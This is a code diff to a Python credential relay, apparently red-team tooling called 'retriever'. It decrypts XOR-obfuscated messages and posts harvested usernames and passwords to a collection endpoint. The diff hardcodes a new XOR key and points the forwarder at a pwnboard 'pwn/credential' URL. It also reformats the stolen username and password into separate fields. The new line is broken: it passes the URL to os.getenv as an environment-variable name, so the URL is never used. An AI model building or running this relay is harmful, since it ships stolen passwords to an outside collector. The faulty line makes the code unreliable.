@@ -8,9 +8,10 @@ from dotenv import load_dotenv
 load_dotenv()
 
 url=os.getenv("WEBHOOK")
-key=os.getenv("XOR_KEY", "bingus")
+key=os.getenv("XOR_KEY", "itsoshrimple")
 port=os.getenv("PORT",8000)
-sawmill_url=os.getenv("SAWMILLURL")
+sawmill_url=os.getenv("http://pwnboard.win/pwn/credential")
+
 
 # From GeeksForGeeks <3
 def xor_decrypt(inpString):
@@ -65,7 +66,10 @@ def fwd_sawmill(msg):
 
     data = {}
     data["ip"] = ip
-    data["credentials"] = user + ":" + pwd
+    data["service"] = "system"
+    data["username"] = user 
+    data["password"] = pwd
+    data["message"] = "PW collected from retriever"
 
     payload = json.dumps(data)
      # Send and check result
